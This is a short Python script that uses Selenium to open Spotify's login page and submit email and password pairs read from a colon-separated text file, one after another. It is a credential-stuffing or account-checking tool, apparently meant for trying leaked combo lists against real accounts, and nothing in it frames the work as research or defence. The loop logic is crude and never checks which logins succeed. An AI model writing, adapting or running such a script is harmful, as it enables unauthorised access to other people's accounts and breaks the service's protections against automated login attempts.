from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import re
source = open('text.txt').read()
source_list = re.split(':|\n',source) #depends on your .txt file
emails = []
passwords = []


for i in source_list[0:len(source_list):2]:
    emails.append(i)
for j in source_list[1:len(source_list)+1:2]:
    passwords.append(j)


print(emails)
print(passwords)
bot = webdriver.Firefox()

bot.get('https://accounts.spotify.com/en/login')
time.sleep(3)
while bot.find_element_by_name('username') and bot.find_element_by_name('password'):
    email = bot.find_element_by_name('username')
    password = bot.find_element_by_name('password')
    email.clear()
    password.clear()
    for i in range(len(emails)):
        email.send_keys(emails[i])
        password.send_keys(passwords[i])
        password.send_keys(Keys.RETURN)
        time.sleep(2)
        email.clear()
        password.clear()
        time.sleep(2)
